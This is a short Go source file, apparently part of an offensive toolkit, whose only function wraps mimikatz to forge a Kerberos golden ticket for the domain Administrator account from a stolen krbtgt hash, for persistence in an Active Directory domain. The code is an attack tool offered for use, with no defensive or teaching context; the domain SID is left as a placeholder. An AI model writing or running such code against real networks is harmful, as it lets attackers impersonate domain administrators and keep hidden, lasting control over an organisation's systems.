package ad_persistence

import (
"os/exec"
)

type GoldenTicketPersist struct {
Domain string
}

func NewGoldenTicketPersist(domain string) *GoldenTicketPersist {
return &GoldenTicketPersist{
Domain: domain,
}
}

func (g *GoldenTicketPersist) Persist(krbtgtHash string) error {
cmd := exec.Command("mimikatz", "kerberos::golden", "/user:Administrator", "/domain:"+g.Domain, "/sid:S-1-5-21-...", "/krbtgt:"+krbtgtHash, "/ticket:golden.kirbi")
output, err := cmd.Output()
if err != nil {
return err
}
print(string(output))
return nil
}
